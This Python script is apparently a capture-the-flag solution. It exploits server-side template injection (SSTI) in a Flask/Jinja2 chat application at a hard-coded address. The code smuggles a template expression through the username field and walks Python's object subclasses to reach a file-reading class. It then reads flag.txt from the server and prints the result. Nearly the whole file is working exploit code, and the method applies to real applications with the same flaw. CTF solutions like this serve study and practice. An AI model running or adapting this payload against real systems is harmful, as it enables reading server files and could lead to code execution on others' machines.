# based on https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

import requests

DOMAIN = "http://34.44.129.8:53590"

session = requests.Session()

def get_index():
    resp = session.post(DOMAIN + "/set_username", data={"username": "{{" + """''.__class__.__base__.__subclasses__(),'"""})
    assert b"Chat Room" in resp.content, resp.content.decode()
    resp = session.post(DOMAIN + "/send_message", data={"message": "a"})
    assert resp.status_code == 500
    resp = session.post(DOMAIN + "/set_username", data={"username": "'" + "}}"})
    assert resp.status_code == 500
    resp = session.post(DOMAIN + "/send_message", data={"message": "a"})
    assert resp.status_code == 200
    resp = session.get(DOMAIN)
    content = resp.content.decode()
    i = content.index("_io._IOBase")
    return content[:i].count("class") - 3


def get_flag(idx: int):
    resp = session.post(DOMAIN + "/set_username", data={"username": "{{" + f"''.__class__.__base__.__subclasses__()[{idx}].__subclasses__()[2].__subclasses__()[0]('flag.txt').read(),'"})
    assert b"Chat Room" in resp.content, resp.content.decode()
    session.post(DOMAIN + "/send_message", data={"message": "a"})
    session.post(DOMAIN + "/set_username", data={"username": "'" + "}}"})
    session.post(DOMAIN + "/send_message", data={"message": "a"})
    resp = session.get(DOMAIN)
    print(resp.content.decode())


def main():
    idx = get_index()
    print(idx)
    get_flag(idx)


if __name__ == '__main__':
    main()
